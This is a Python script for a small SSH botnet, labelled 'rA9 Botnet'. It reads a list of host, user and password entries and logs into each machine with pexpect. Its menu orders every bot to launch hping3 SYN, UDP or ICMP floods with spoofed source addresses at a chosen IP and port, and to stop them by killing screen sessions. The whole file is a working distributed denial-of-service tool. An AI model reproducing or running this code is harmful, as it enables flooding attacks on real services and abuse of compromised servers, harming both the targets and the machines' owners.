from pexpect import pxssh
import re
import os
botNet = []

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
       try:
           s = pxssh.pxssh(encoding='utf-8')
           s.login(self.host, self.user, self.password)
           return s
       except Exception as e:
           print("[!] Something went wrong !")
           print("[!] Error detail : " + e)

    def send_command(self, cmd):
       try:
           self.session.sendline(cmd)
           self.session.prompt()
           return self.session.before
       except:
           pass

def botnetCommand(command):
   for client in botNet:
       output = client.send_command(command)
       print("[+] Output from : "+client.host)
       print(output)

def addClient(host, user, password):
   client = Client(host, user, password)
   botNet.append(client)


def importServerList():
   with open('serverList') as serverList:
       for i in serverList:
           serverList = re.split(':',i)
           addClient(str(serverList[0]), str(serverList[1]), str(serverList[2]))


def MainMenu():
    print("------------------ rA9 Botnet ------------------")
    print("|1| SYN Flood Attack")
    print("|2| UDP Flood Attack.")
    print("|3| ICMP Flood Attack.")
    print("|4| Stop all attacks.")

    print("-------------------------------------------------------")
    choice = input("|+| Your choice : ")
    if choice == "1":
       host = input("|+| Select host IP : ")
       port = input("|+| Select port : ")
       print("|!| Botnet list importing, please wait...")
       importServerList()
       os.system("clear")
       print("|!| Attack starting...")
       botnetCommand("screen -d -m hping3 -c 100000 -d 120 -S -w 64 -p "+port+" --flood "+host+" --rand-source || exit")

    if choice == "2":
       host = input("|+| Select host IP : ")
       port = input("|+| Select port : ")
       print("|!| Botnet list importing, please wait...")
       importServerList()
       os.system("clear")
       print("|!| Attack starting...")
       botnetCommand("screen -d -m hping3 --flood --rand-source --udp -p "+port+" "+host+" || exit")

    if choice == "3":
       host = input("|+| Select host IP : ")
       port = input("|+| Select port : ")
       print("|!| Botnet list importing, please wait...")
       importServerList()
       os.system("clear")
       print("|!| Attack starting...")
       botnetCommand("screen -d -m hping3 --flood --rand-source -1 -p "+port+" "+host+" || exit")

    if choice == "4":
       print("|!| Botnet list importing, please wait...")
       importServerList()
       os.system("clear")
       print("|!| All attacks being stopped...")
       botnetCommand("pkill screen")
       print("|+| All attacks terminated.")

MainMenu()


